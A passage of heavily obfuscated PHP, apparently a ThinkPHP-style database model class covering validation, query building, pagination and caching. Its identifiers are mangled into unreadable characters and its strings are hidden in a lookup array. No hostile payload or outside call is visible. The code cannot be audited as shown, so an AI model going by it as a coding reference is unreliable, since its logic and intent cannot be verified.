(!empty($this->options[$ˆ„áÚúñ[397]])) { $İüä©·’ = $this->options[$ˆ„áÚúñ[397]]; unset($this->options[$ˆ„áÚúñ[397]]); } elseif (!empty($this->_auto)) { $İüä©·’ = $this->_auto; } if (isset($İüä©·’)) { foreach ($İüä©·’ as $¹ğù£úè) { if (empty($¹ğù£úè[2])) { $¹ğù£úè[2] = THINK_MODEL_INSERT; } if ($áş§º¿Ø == $¹ğù£úè[2] || $¹ğù£úè[2] == THINK_MODEL_BOTH) { switch (trim($¹ğù£úè[3])) { case $ˆ„áÚúñ[398]: case $ˆ„áÚúñ[399]: $Ü¯å“™ = isset($¹ğù£úè[4]) ? (array) $¹ğù£úè[4] : array(); if (isset($¼ŒÈ™›¼[$¹ğù£úè[0]])) { array_unshift($Ü¯å“™, $¼ŒÈ™›¼[$¹ğù£úè[0]]); } if ($ˆ„áÚúñ[398] == $¹ğù£úè[3]) { $¼ŒÈ™›¼[$¹ğù£úè[0]] = call_user_func_array($¹ğù£úè[1], $Ü¯å“™); } else { $¼ŒÈ™›¼[$¹ğù£úè[0]] = call_user_func_array(array(&$this, $¹ğù£úè[1]), $Ü¯å“™); } break; case $ˆ„áÚúñ[352]: $¼ŒÈ™›¼[$¹ğù£úè[0]] = $¼ŒÈ™›¼[$¹ğù£úè[1]]; break; case $ˆ„áÚúñ[400]: if ($ˆ„áÚúñ[12] === $¼ŒÈ™›¼[$¹ğù£úè[0]]) { unset($¼ŒÈ™›¼[$¹ğù£úè[0]]); } break; case $ˆ„áÚúñ[401]: default: $¼ŒÈ™›¼[$¹ğù£úè[0]] = $¹ğù£úè[1]; } if (!1 === $¼ŒÈ™›¼[$¹ğù£úè[0]]) { unset($¼ŒÈ™›¼[$¹ğù£úè[0]]); } } } } return $¼ŒÈ™›¼; } protected function autoValidation($ôéÆ¢‚¡, $¨î­³Ì) { $ÙşË¿¸¬ =& $_SERVER[Š—Â“œÔ]; if (!empty($this->options[$ÙşË¿¸¬[402]])) { $¼……Ìû¤ = $this->options[$ÙşË¿¸¬[402]]; unset($this->options[$ÙşË¿¸¬[402]]); } elseif (!empty($this->_validate)) { $¼……Ìû¤ = $this->_validate; } if (isset($¼……Ìû¤)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¼……Ìû¤ as $û‹¯şˆÏ => $©†¢ÓçÊ) { if (empty($©†¢ÓçÊ[5]) || $©†¢ÓçÊ[5] == THINK_MODEL_BOTH || $©†¢ÓçÊ[5] == $¨î­³Ì) { if (0 == strpos($©†¢ÓçÊ[2], $ÙşË¿¸¬[403]) && strpos($©†¢ÓçÊ[2], $ÙşË¿¸¬[404])) { $©†¢ÓçÊ[2] = think_lang(substr($©†¢ÓçÊ[2], 2, -1)); } $©†¢ÓçÊ[3] = isset($©†¢ÓçÊ[3]) ? $©†¢ÓçÊ[3] : THINK_EXISTS_VALIDATE; $©†¢ÓçÊ[4] = isset($©†¢ÓçÊ[4]) ? $©†¢ÓçÊ[4] : $ÙşË¿¸¬[405]; switch ($©†¢ÓçÊ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ôéÆ¢‚¡, $©†¢ÓçÊ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ÙşË¿¸¬[12] != trim($ôéÆ¢‚¡[$©†¢ÓçÊ[0]])) { if (!1 === $this->_validationField($ôéÆ¢‚¡, $©†¢ÓçÊ)) { return !1; } } break; default: if (isset($ôéÆ¢‚¡[$©†¢ÓçÊ[0]])) { if (!1 === $this->_validationField($ôéÆ¢‚¡, $©†¢ÓçÊ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($†àÊçëá, $Ö©”ëÏÅ) { if (!1 === $this->_validationFieldItem($†àÊçëá, $Ö©”ëÏÅ)) { if ($this->patchValidate) { $this->error[$Ö©”ëÏÅ[0]] = $Ö©”ëÏÅ[2]; } else { $this->error = $Ö©”ëÏÅ[2]; return !1; } } return; } protected function _validationFieldItem($ÓäÌ‹ùŞ, $‰ÅœŸ¹…) { $´âƒ–˜ƒ =& $_SERVER[Š—Â“œÔ]; switch (strtolower(trim($‰ÅœŸ¹…[4]))) { case $´âƒ–˜ƒ[398]: case $´âƒ–˜ƒ[399]: $œ³ñ¡õå = isset($‰ÅœŸ¹…[6]) ? (array) $‰ÅœŸ¹…[6] : array(); if (is_string($‰ÅœŸ¹…[0]) && strpos($‰ÅœŸ¹…[0], $´âƒ–˜ƒ[50])) { $‰ÅœŸ¹…[0] = explode($´âƒ–˜ƒ[50], $‰ÅœŸ¹…[0]); } if (is_array($‰ÅœŸ¹…[0])) { foreach ($‰ÅœŸ¹…[0] as $ô•×Òãº) { $´æ¦‹«ò[$ô•×Òãº] = $ÓäÌ‹ùŞ[$ô•×Òãº]; } array_unshift($œ³ñ¡õå, $´æ¦‹«ò); } else { array_unshift($œ³ñ¡õå, $ÓäÌ‹ùŞ[$‰ÅœŸ¹…[0]]); } if ($´âƒ–˜ƒ[398] == $‰ÅœŸ¹…[4]) { return call_user_func_array($‰ÅœŸ¹…[1], $œ³ñ¡õå); } else { return call_user_func_array(array(&$this, $‰ÅœŸ¹…[1]), $œ³ñ¡õå); } case $´âƒ–˜ƒ[406]: return $ÓäÌ‹ùŞ[$‰ÅœŸ¹…[0]] == $ÓäÌ‹ùŞ[$‰ÅœŸ¹…[1]]; case $´âƒ–˜ƒ[407]: if (is_string($‰ÅœŸ¹…[0]) && strpos($‰ÅœŸ¹…[0], $´âƒ–˜ƒ[50])) { $‰ÅœŸ¹…[0] = explode($´âƒ–˜ƒ[50], $‰ÅœŸ¹…[0]); } $ãà…ÕâË = array(); if (is_array($‰ÅœŸ¹…[0])) { foreach ($‰ÅœŸ¹…[0] as $ô•×Òãº) { $ãà…ÕâË[$ô•×Òãº] = $ÓäÌ‹ùŞ[$ô•×Òãº]; } } else { $ãà…ÕâË[$‰ÅœŸ¹…[0]] = $ÓäÌ‹ùŞ[$‰ÅœŸ¹…[0]]; } if (!empty($ÓäÌ‹ùŞ[$this->getPk()])) { $ãà…ÕâË[$this->getPk()] = array($´âƒ–˜ƒ[408], $ÓäÌ‹ùŞ[$this->getPk()]); } if ($this->where($ãà…ÕâË)->find()) { return !1; } return !0; default: return $this->check($ÓäÌ‹ùŞ[$‰ÅœŸ¹…[0]], $‰ÅœŸ¹…[1], $‰ÅœŸ¹…[4]); } } public function check($éÉÓ¡ÇÇ, $¥ş‰Û™, $¥éŠñÉş = "\x72\145\x67\x65\170") { $ÇœşàÍ· =& $_SERVER[Š—Â“œÔ]; $¥éŠñÉş = strtolower(trim($¥éŠñÉş)); switch ($¥éŠñÉş) { case $ÇœşàÍ·[7]: case $ÇœşàÍ·[409]: $ûÄÁ¹¡ = is_array($¥ş‰Û™) ? $¥ş‰Û™ : explode($ÇœşàÍ·[50], $¥ş‰Û™); return $¥éŠñÉş == $ÇœşàÍ·[7] ? in_array($éÉÓ¡ÇÇ, $ûÄÁ¹¡) : !in_array($éÉÓ¡ÇÇ, $ûÄÁ¹¡); case $ÇœşàÍ·[410]: case $ÇœşàÍ·[411]: if (is_array($¥ş‰Û™)) { $øØºæ´¯ = $¥ş‰Û™[0]; $ Éõ­ş· = $¥ş‰Û™[1]; } else { list($øØºæ´¯, $ Éõ­ş·) = explode($ÇœşàÍ·[50], $¥ş‰Û™); } return $¥éŠñÉş == $ÇœşàÍ·[410] ? $éÉÓ¡ÇÇ >= $øØºæ´¯ && $éÉÓ¡ÇÇ <= $ Éõ­ş· : $éÉÓ¡ÇÇ < $øØºæ´¯ || $éÉÓ¡ÇÇ > $ Éõ­ş·; case $ÇœşàÍ·[412]: case $ÇœşàÍ·[413]: return $¥éŠñÉş == $ÇœşàÍ·[412] ? $éÉÓ¡ÇÇ == $¥ş‰Û™ : $éÉÓ¡ÇÇ != $¥ş‰Û™; case $ÇœşàÍ·[414]: $ÑˆãıÖÕ = mb_strlen($éÉÓ¡ÇÇ, $ÇœşàÍ·[415]); if (strpos($¥ş‰Û™, $ÇœşàÍ·[50])) { list($øØºæ´¯, $ Éõ­ş·) = explode($ÇœşàÍ·[50], $¥ş‰Û™); return $ÑˆãıÖÕ >= $øØºæ´¯ && $ÑˆãıÖÕ <= $ Éõ­ş·; } else { return $ÑˆãıÖÕ == $¥ş‰Û™; } case $ÇœşàÍ·[416]: list($îŒàˆ°ì, $ÇïœÛª„) = explode($ÇœşàÍ·[50], $¥ş‰Û™); if (!is_numeric($îŒàˆ°ì)) { $îŒàˆ°ì = strtotime($îŒàˆ°ì); } if (!is_numeric($ÇïœÛª„)) { $ÇïœÛª„ = strtotime($ÇïœÛª„); } return NOW_TIME >= $îŒàˆ°ì && NOW_TIME <= $ÇïœÛª„; case $ÇœşàÍ·[417]: return in_array(get_client_ip(), explode($ÇœşàÍ·[50], $¥ş‰Û™)); case $ÇœşàÍ·[418]: return !in_array(get_client_ip(), explode($ÇœşàÍ·[50], $¥ş‰Û™)); case $ÇœşàÍ·[405]: default: return $this->regex($éÉÓ¡ÇÇ, $¥ş‰Û™); } } public function query($°… ›Íø, $äœÒŸŞ’ = false) { $ğ¾“ã’‘ =& $_SERVER[Š—Â“œÔ]; if (!is_bool($äœÒŸŞ’) && !is_array($äœÒŸŞ’)) { $äœÒŸŞ’ = func_get_args(); array_shift($äœÒŸŞ’); } $°… ›Íø = str_replace(array($ğ¾“ã’‘[287], $ğ¾“ã’‘[419]), $ğ¾“ã’‘[53], $°… ›Íø); $°… ›Íø = $this->parseSql($°… ›Íø, $äœÒŸŞ’); return $this->db->query($°… ›Íø); } public function execute($ŸÁŒ¤§á, $Îˆ™‘ƒ = false) { if (!is_bool($Îˆ™‘ƒ) && !is_array($Îˆ™‘ƒ)) { $Îˆ™‘ƒ = func_get_args(); array_shift($Îˆ™‘ƒ); } $ŸÁŒ¤§á = $this->parseSql($ŸÁŒ¤§á, $Îˆ™‘ƒ); return $this->db->execute($ŸÁŒ¤§á); } protected function parseSql($›™öı¤, $‘“Œ‹½) { $¬÷œÇó­ =& $_SERVER[Š—Â“œÔ]; if (!0 === $‘“Œ‹½) { $Ä©áˆÁË = $this->_parseOptions(); $›™öı¤ = $this->db->parseSql($›™öı¤, $Ä©áˆÁË); } elseif (is_array($‘“Œ‹½)) { $‘“Œ‹½ = array_map(array($this->db, $¬÷œÇó­[420]), $‘“Œ‹½); $›™öı¤ = vsprintf($›™öı¤, $‘“Œ‹½); } else { $›™öı¤ = strtr($›™öı¤, array($¬÷œÇó­[421] => $this->getTableName(), $¬÷œÇó­[422] => think_config($¬÷œÇó­[323]))); } $this->db->setModel($this->name); return $›™öı¤; } public function db($ÚûÉ÷İÑ = '', $Õ˜Ê±æó = '', $õ ©²È = array()) { $–Æúúâù =& $_SERVER[Š—Â“œÔ]; if ($–Æúúâù[12] === $ÚûÉ÷İÑ && $this->db) { return $this->db; } static $å¹¸·Î = array(); static $‘¬ÁæÊá = array(); if (!isset($‘¬ÁæÊá[$ÚûÉ÷İÑ]) || isset($‘¬ÁæÊá[$ÚûÉ÷İÑ]) && $Õ˜Ê±æó && $å¹¸·Î[$ÚûÉ÷İÑ] != $Õ˜Ê±æó) { if (!empty($Õ˜Ê±æó) && is_string($Õ˜Ê±æó) && !1 === strpos($Õ˜Ê±æó, $–Æúúâù[8])) { $Õ˜Ê±æó = think_config($Õ˜Ê±æó); } $ÚûÉ÷İÑ = think_guid($Õ˜Ê±æó); $‘¬ÁæÊá[$ÚûÉ÷İÑ] = Db::getInstance($Õ˜Ê±æó); } elseif (NULL === $Õ˜Ê±æó) { $‘¬ÁæÊá[$ÚûÉ÷İÑ]->close(); unset($‘¬ÁæÊá[$ÚûÉ÷İÑ]); return; } if (!empty($õ ©²È)) { if (is_string($õ ©²È)) { parse_str($õ ©²È, $õ ©²È); } foreach ($õ ©²È as $Åƒò—ú => $ƒ¼ß·‡ ) { $this->setProperty($Åƒò—ú, $ƒ¼ß·‡ ); } } $å¹¸·Î[$ÚûÉ÷İÑ] = $Õ˜Ê±æó; $this->db = $‘¬ÁæÊá[$ÚûÉ÷İÑ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $çŒçÏâ = get_class($this); if ($çŒçÏâ == $_SERVER[Š—Â“œÔ][423]) { return $this->name; } $this->name = substr($çŒçÏâ, 0, -5); } return $this->name; } public function getTableName() { $Ûİãõú =& $_SERVER[Š—Â“œÔ]; if (empty($this->trueTableName)) { $ñ‘ £ = !empty($this->tablePrefix) ? $this->tablePrefix : $Ûİãõú[12]; if (!empty($this->tableName)) { $ñ‘ £ .= $this->tableName; } else { $ñ‘ £ .= think_parse_name($this->name); } $this->trueTableName = strtolower($ñ‘ £); } return (!empty($this->dbName) ? $this->dbName . $Ûİãõú[10] : $Ûİãõú[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ãç¤Šæ¦ =& $_SERVER[Š—Â“œÔ]; return isset($this->fields[$ãç¤Šæ¦[330]]) ? $this->fields[$ãç¤Šæ¦[330]] : $this->pk; } public function getDbFields() { $¿¿¡íŒ =& $_SERVER[Š—Â“œÔ]; if (isset($this->options[$¿¿¡íŒ[358]])) { $¶¾¨ì‰õ = $this->db->getFields($this->options[$¿¿¡íŒ[358]]); return $¶¾¨ì‰õ ? array_keys($¶¾¨ì‰õ) : !1; } if ($this->fields) { $¶¾¨ì‰õ = $this->fields; unset($¶¾¨ì‰õ[$¿¿¡íŒ[329]], $¶¾¨ì‰õ[$¿¿¡íŒ[330]], $¶¾¨ì‰õ[$¿¿¡íŒ[331]], $¶¾¨ì‰õ[$¿¿¡íŒ[328]]); return $¶¾¨ì‰õ; } return !1; } public function data($ô¹™æë… = '') { $£¼ÙÄ‹í =& $_SERVER[Š—Â“œÔ]; if ($£¼ÙÄ‹í[12] === $ô¹™æë… && !empty($this->data)) { return $this->data; } if (is_object($ô¹™æë…)) { $ô¹™æë… = get_object_vars($ô¹™æë…); } elseif (is_string($ô¹™æë…)) { parse_str($ô¹™æë…, $ô¹™æë…); } elseif (!is_array($ô¹™æë…)) { think_exception(think_lang($£¼ÙÄ‹í[350])); } $this->data = $ô¹™æë…; return $this; } public function join($‹‚Ä±¹µ) { $ë´…†ı¯ =& $_SERVER[Š—Â“œÔ]; if (is_array($‹‚Ä±¹µ)) { $this->options[$ë´…†ı¯[361]] = $‹‚Ä±¹µ; } elseif (!empty($‹‚Ä±¹µ)) { $this->options[$ë´…†ı¯[361]][] = $‹‚Ä±¹µ; } return $this; } public function union($Œ™¤š‰, $ªÒİÏ = false) { $ÕåÑó€Æ =& $_SERVER[Š—Â“œÔ]; if (empty($Œ™¤š‰)) { return $this; } if ($ªÒİÏ) { $this->options[$ÕåÑó€Æ[424]][$ÕåÑó€Æ[425]] = !0; } if (is_object($Œ™¤š‰)) { $Œ™¤š‰ = get_object_vars($Œ™¤š‰); } if (is_string($Œ™¤š‰)) { $Ç¡›ïé¾ = $Œ™¤š‰; } elseif (is_array($Œ™¤š‰)) { if (isset($Œ™¤š‰[0])) { $this->options[$ÕåÑó€Æ[424]] = array_merge($this->options[$ÕåÑó€Æ[424]], $Œ™¤š‰); return $this; } else { $Ç¡›ïé¾ = $Œ™¤š‰; } } else { think_exception(think_lang($ÕåÑó€Æ[350])); } $this->options[$ÕåÑó€Æ[424]][] = $Ç¡›ïé¾; return $this; } public function cache($˜Ã•“ì¬ = true, $°ïÊó† = null, $£ÑÎß»‰ = '') { $Ú­ıü“ó =& $_SERVER[Š—Â“œÔ]; if (!1 !== $˜Ã•“ì¬) { $this->options[$Ú­ıü“ó[426]] = array($Ú­ıü“ó[97] => $˜Ã•“ì¬, $Ú­ıü“ó[416] => $°ïÊó†, $Ú­ıü“ó[33] => $£ÑÎß»‰); } return $this; } public function field($âÎ©—Àï, $Ø‚ÚÛ»æ = false) { $”ÓÌØÌ =& $_SERVER[Š—Â“œÔ]; if (!0 === $âÎ©—Àï) { $‚ á–íç = $this->getDbFields(); $âÎ©—Àï = $‚ á–íç ? $‚ á–íç : $”ÓÌØÌ[222]; } elseif ($Ø‚ÚÛ»æ) { if (is_string($âÎ©—Àï)) { $âÎ©—Àï = explode($”ÓÌØÌ[50], $âÎ©—Àï); } $‚ á–íç = $this->getDbFields(); $âÎ©—Àï = $‚ á–íç ? array_diff($‚ á–íç, $âÎ©—Àï) : $âÎ©—Àï; } $this->options[$”ÓÌØÌ[352]] = $âÎ©—Àï; return $this; } public function scope($ØÔòÄÖ¢ = '', $ŸÁ„¿¡× = NULL) { $óÔ¢Íó =& $_SERVER[Š—Â“œÔ]; if ($óÔ¢Íó[12] === $ØÔòÄÖ¢) { if (isset($this->_scope[$óÔ¢Íó[37]])) { $µ‚ºÃß = $this->_scope[$óÔ¢Íó[37]]; } else { return $this; } } elseif (is_string($ØÔòÄÖ¢)) { $ã†ÖäŞ§ = explode($óÔ¢Íó[50], $ØÔòÄÖ¢); $µ‚ºÃß = array(); foreach ($ã†ÖäŞ§ as $ÆïğÑ) { if (!isset($this->_scope[$ÆïğÑ])) { continue; } $µ‚ºÃß = array_merge($µ‚ºÃß, $this->_scope[$ÆïğÑ]); } if (!empty($ŸÁ„¿¡×) && is_array($ŸÁ„¿¡×)) { $µ‚ºÃß = array_merge($µ‚ºÃß, $ŸÁ„¿¡×); } } elseif (is_array($ØÔòÄÖ¢)) { $µ‚ºÃß = $ØÔòÄÖ¢; } if (is_array($µ‚ºÃß) && !empty($µ‚ºÃß)) { $this->options = array_merge($this->options, array_change_key_case($µ‚ºÃß)); } return $this; } public function where($¿³£†£ß, $¨ú¾Ù¸½ = null) { $««Å”§ =& $_SERVER[Š—Â“œÔ]; if (!is_null($¨ú¾Ù¸½) && is_string($¿³£†£ß)) { if (!is_array($¨ú¾Ù¸½)) { $¨ú¾Ù¸½ = func_get_args(); array_shift($¨ú¾Ù¸½); } $¨ú¾Ù¸½ = array_map(array($this->db, $««Å”§[420]), $¨ú¾Ù¸½); $¿³£†£ß = vsprintf($¿³£†£ß, $¨ú¾Ù¸½); } elseif (is_object($¿³£†£ß)) { $¿³£†£ß = get_object_vars($¿³£†£ß); } elseif (is_array($¿³£†£ß)) { foreach ($¿³£†£ß as $çªó†ÃĞ => $Àøµñ·) { if ((is_numeric($çªó†ÃĞ) || !$çªó†ÃĞ) && is_string($Àøµñ·)) { if (strpos($Àøµñ·, $««Å”§[427]) === 0) { continue; } think_trace($««Å”§[428], $««Å”§[12], $««Å”§[49]); die; } } } if (is_string($¿³£†£ß) && $««Å”§[12] != $¿³£†£ß) { $Í¦«ùÓ¶ = array(); $Í¦«ùÓ¶[$««Å”§[429]] = $¿³£†£ß; $¿³£†£ß = $Í¦«ùÓ¶; } if (isset($this->options[$««Å”§[354]])) { $this->options[$««Å”§[354]] = array_merge($this->options[$««Å”§[354]], $¿³£†£ß); } else { $this->options[$««Å”§[354]] = $¿³£†£ß; } return $this; } public function limit($¢Ã³…ªá, $ìîµÙ™‰ = null) { $‡û¦øßï =& $_SERVER[Š—Â“œÔ]; $this->options[$‡û¦øßï[369]] = is_null($ìîµÙ™‰) ? $¢Ã³…ªá : $¢Ã³…ªá . $‡û¦øßï[50] . $ìîµÙ™‰; return $this; } public function page($ô›€Å, $Œ›¤÷òÈ = null) { $¹áë¾å =& $_SERVER[Š—Â“œÔ]; $this->options[$¹áë¾å[430]] = is_null($Œ›¤÷òÈ) ? $ô›€Å : $ô›€Å . $¹áë¾å[50] . $Œ›¤÷òÈ; return $this; } public function comment($¢¢§é¬¸) { $this->options[$_SERVER[Š—Â“œÔ][431]] = $¢¢§é¬¸; return $this; } public function setProperty($Şõ©éçº, $¡™Œ¨×™) { if (property_exists($this, $Şõ©éçº)) { $this->{$Şõ©éçº} = $¡™Œ¨×™; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\151\146\x79\124\151\x6d\x65", "\164\151\x6d\145", "\x69\x6e\163\145\162\164\x2c\165\x70\x64\141\x74\145", "\146\165\x6e\x63\x74\151\157\156"), array("\x63\x72\145\x61\164\x65\124\151\x6d\x65", "\x74\x69\155\145", "\x69\x6e\x73\x65\162\164", "\146\165\156\143\164\x69\157\x6e")); public function setDataAuto($„Èñ˜şü) { $this->dataAuto = $„Èñ˜şü; } public function __construct($æÏò¡òÜ = '', $Ó“ó•’— = '', $ü³Öãã… = '') { parent::__construct($æÏò¡òÜ, $Ó“ó•’—, $ü³Öãã…); } protected $tableMeta = array(); protected function _beforeInsert(&$²åí™á, $ªÃñå…÷) { $à§ğ‚Õª =& $_SERVER[Š—Â“œÔ]; if (!$this->checkDataAutoHas($à§ğ‚Õª[432])) { return; } $this->dataBeforeFilter($²åí™á, $à§ğ‚Õª[432]); } protected function _beforeUpdate(&$êº£¾, $¾ºğñ«Ò) { $…¼ÁîË® =& $_SERVER[Š—Â“œÔ]; if (!$this->checkDataAutoHas($…¼ÁîË®[433])) { return; } $this->dataBeforeFilter($êº£¾, $…¼ÁîË®[433]); } protected function _afterSelect(&$§ºÊÑë, $„î¨„Œ) { if (!is_array($§ºÊÑë)) { return; } if (!$this->checkDataAutoHas($_SERVER[Š—Â“œÔ][434])) { return; } foreach ($§ºÊÑë as &$’ù’üè•) { $this->dataAfterFilter($’ù’üè•); } unset($’ù’üè•); } protected function _afterFind(&$˜êƒèê, $íşóÛÍŸ) { if (!is_array($˜êƒèê)) { return; } if (!$this->checkDataAutoHas($_SERVER[Š—Â“œÔ][434])) { return; } $this->dataAfterFilter($˜êƒèê); } public static function textEncode($üÑ¾˜î) { if (!$üÑ¾˜î) { return $üÑ¾˜î; } $¯—™œœŞ = json_encode($üÑ¾˜î); $¯—™œœŞ = preg_replace_callback($_SERVER[Š—Â“œÔ][435], function ($œ„é²”ì) { return addslashes($œ„é²”ì[0]); }, $¯—™œœŞ); return json_decode($¯—™œœŞ); } public static function textDecode($™„”íï) { $Â´‹Éˆ” =& $_SERVER[Š—Â“œÔ]; $ã‹–Ã®è = json_encode($™„”íï); $ã‹–Ã®è = preg_replace_callback($Â´‹Éˆ”[436], function ($®Ï İ¥) { return $_SERVER[Š—Â“œÔ][100]; }, $ã‹–Ã®è); return json_decode($ã‹–Ã®è); } public function setAutoIncrement($İÆÕùµ¿) { $’–¥Ş—Á = array($this->getPk() => $İÆÕùµ¿); $¢ÙŸºà = $this->data($’–¥Ş—Á)->add(); if ($¢ÙŸºà) { $this->delete($¢ÙŸºà); } } public function getAutoIncrement() { $äËéæ…š = $this->getTableName(); $‚î¯¢é = $this->max($this->getPk()); $–É›»İ› = $this->query("\163\x68\x6f\167\40\164\x61\142\x6c\x65\40\x73\x74\141\164\x75\163\40\x77\150\145\x72\x65\40\116\x61\155\x65\x3d\x27{$äËéæ…š}\47"); $¨ÀşÒµÏ = $–É›»İ›[0][$_SERVER[Š—Â“œÔ][437]]; $¿Ò »ÍÇ = max($‚î¯¢é, $¨ÀşÒµÏ); return $¿Ò »ÍÇ; } protected function _callBefore($ú¢•ëŒ€, $şãßƒ×Û) { return $this->cacheCallCheck($ú¢•ëŒ€, $şãßƒ×Û, !1); } protected function _callAfter($ä´õ—Ø¸, $Œ…¨–È¡) { return $this->cacheCallCheck($ä´õ—Ø¸, $Œ…¨–È¡, !0); } protected function cacheFunctionAlias($ÍĞÏã­‹) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Ÿ™Ëâä, $ò› õ­, $Å›À€ş = false) { $å²ØóìË =& $_SERVER[Š—Â“œÔ]; $§ÁÌº—ƒ = $this->cacheFunctionAlias($ò› õ­); if (!$§ÁÌº—ƒ) { return; } foreach ($§ÁÌº—ƒ as $ù¼Ø£á± => $Ö™Õ¼ç…) { $¡ñƒÂèÀ = $Ö™Õ¼ç…[0]; $ã¨´ô¹Œ = explode($å²ØóìË[50], $Ö™Õ¼ç…[1]); $Ä©‹ºè® = isset($Ö™Õ¼ç…[2]) ? $Ö™Õ¼ç…[2] : $å²ØóìË[12]; if ($Ÿ™Ëâä == $ù¼Ø£á±) { return $this->cacheFunctionGet($ù¼Ø£á±, $¡ñƒÂèÀ, $Ä©‹ºè®); } if ($Å›À€ş && in_array($Ÿ™Ëâä, $ã¨´ô¹Œ)) { $this->cacheFunctionClear($ù¼Ø£á±, $¡ñƒÂèÀ, $Ä©‹ºè®); } } } public function cacheFunctionGet($ûõş â·, $Àå£Ñ­è, $÷Ÿî‰ô¡ = '') { $äÚİéÎ = $this->cacheKeyMake($ûõş â·, $Àå£Ñ­è, $÷Ÿî‰ô¡); $®¾àÜ§´ = Cache::get($äÚİéÎ); if (!is_array($®¾àÜ§´)) { $®¾àÜ§´ = call_user_func_array(array($this, $ûõş â·), array($Àå£Ñ­è, !0)); Cache::set($äÚİéÎ, $®¾àÜ§´); } return $®¾àÜ§´; } public function cacheFunctionClear($š­Å»Ôê, $‘ùşÏ¨, $§ıÛ„Ø² = '') { $ÔòÏî£å = $‘ùşÏ¨; if (!is_array($‘ùşÏ¨)) { $ÔòÏî£å = array($‘ùşÏ¨); } foreach ($ÔòÏî£å as $‹øœÉçõ) { $ºğø÷üŞ = $this->cacheKeyMake($š­Å»Ôê, $‹øœÉçõ, $§ıÛ„Ø²); Cache::remove($ºğø÷üŞ); } } private function cacheKeyMake($Ï—’…ö, $€ùÑ£÷æ, $áÓéÄ”“) { $ß©íÑ¹É =& $_SERVER[Š—Â“œÔ]; if ($áÓéÄ”“) { $€ùÑ£÷æ = $€ùÑ£÷æ . $ß©íÑ¹É[438] . $áÓéÄ”“; } return get_class($this) . $ß©íÑ¹É[11] . $Ï—’…ö . $ß©íÑ¹É[439] . $€ùÑ£÷æ; } protected function selectPageReset() { $æìş°§á =& $_SERVER[Š—Â“œÔ]; if (isset($GLOBALS[$æìş°§á[440]])) { return; } $GLOBALS[$æìş°§á[440]] = isset($GLOBALS[$æìş°§á[7]][$æìş°§á[441]]) ? $GLOBALS[$æìş°§á[7]][$æìş°§á[441]] : !1; $GLOBALS[$æìş°§á[442]] = isset($GLOBALS[$æìş°§á[7]][$æìş°§á[430]]) ? $GLOBALS[$æìş°§á[7]][$æìş°§á[430]] : !1; $GLOBALS[$æìş°§á[7]][$æìş°§á[441]] = !1; $GLOBALS[$æìş°§á[7]][$æìş°§á[430]] = !1; } protected function selectPageRestore() { $êàœİ¾ =& $_SERVER[Š—Â“œÔ]; if (!isset($GLOBALS[$êàœİ¾[440]])) { return; } $GLOBALS[$êàœİ¾[7]][$êàœİ¾[441]] = $GLOBALS[$êàœİ¾[440]]; $GLOBALS[$êàœİ¾[7]][$êàœİ¾[430]] = $GLOBALS[$êàœİ¾[442]]; if ($GLOBALS[$êàœİ¾[7]][$êàœİ¾[441]] === !1) { unset($GLOBALS[$êàœİ¾[7]][$êàœİ¾[441]]); } if ($GLOBALS[$êàœİ¾[7]][$êàœİ¾[430]] === !1) { unset($GLOBALS[$êàœİ¾[7]][$êàœİ¾[430]]); } unset($GLOBALS[$êàœİ¾[440]]); unset($GLOBALS[$êàœİ¾[442]]); } protected function selectPage($ˆ²ìÇäÑ = 200, $â’‘Ëİ = 1) { $è€ ²ç³ =& $_SERVER[Š—Â“œÔ]; global $in; $ã¿´æ„° = $this->optionsValue(); $ö¢½·æ = 50000; $ˆ²ìÇäÑ = isset($in[$è€ ²ç³[441]]) && $in[$è€ ²ç³[441]] ? $in[$è€ ²ç³[441]] : $ˆ²ìÇäÑ; if ($ˆ²ìÇäÑ === -1) { $in[$è€ ²ç³[441]] = !1; $ö¢½·æ = 100000000; $ˆ²ìÇäÑ = $ö¢½·æ; } $Õ§Ä·ô„ = $ã¿´æ„°; $Õ§Ä·ô„[$è€ ²ç³[443]] = array(); $ˆ²ìÇäÑ = intval($ˆ²ìÇäÑ); $ˆ²ìÇäÑ = $ˆ²ìÇäÑ <= 5 ? 5 : ($ˆ²ìÇäÑ >= $ö¢½·æ ? $ö¢½·æ : $ˆ²ìÇäÑ); $â’‘Ëİ = intval(isset($in[$è€ ²ç³[430]]) && $in[$è€ ²ç³[430]] ? $in[$è€ ²ç³[430]] : $â’‘Ëİ); $â’‘Ëİ = $â’‘Ëİ <= 1 ? 1 : $â’‘Ëİ; $ÊƒÔôò = array(); $÷†°ÒşÓ = 1; if ($â’‘Ëİ == 1 && $÷†°ÒşÓ) { $this->optionsValue($ã¿´æ„°); $ÊƒÔôò = $this->page($â’‘Ëİ, $ˆ²ìÇäÑ)->select(); $ˆô™„Ä = is_array($ÊƒÔôò) ? count($ÊƒÔôò) : 0; if ($ˆô™„Ä < $ˆ²ìÇäÑ) { $—¢ò¶†â = 1; } else { $this->optionsValue($Õ§Ä·ô„); $ˆô™„Ä = intval($this->count()); $—¢ò¶†â = ceil($ˆô™„Ä / $ˆ²ìÇäÑ); } } else { $this->optionsValue($Õ§Ä·ô„); $ˆô™„Ä = intval($this->count()); $—¢ò¶†â = ceil($ˆô™„Ä / $ˆ²ìÇäÑ); $â’‘Ëİ = $â’‘Ëİ >= $—¢ò¶†â ? $—¢ò¶†â : $â’‘Ëİ; $this->optionsValue($ã¿´æ„°); $ÊƒÔôò = $this->page($â’‘Ëİ, $ˆ²ìÇäÑ)->select(); } if (!is_array($ÊƒÔôò)) { $ÊƒÔôò = array(); } if ($—¢ò¶†â == 1) { $ˆô™„Ä = count($ÊƒÔôò); } $ÑÍ»»™ = array($è€ 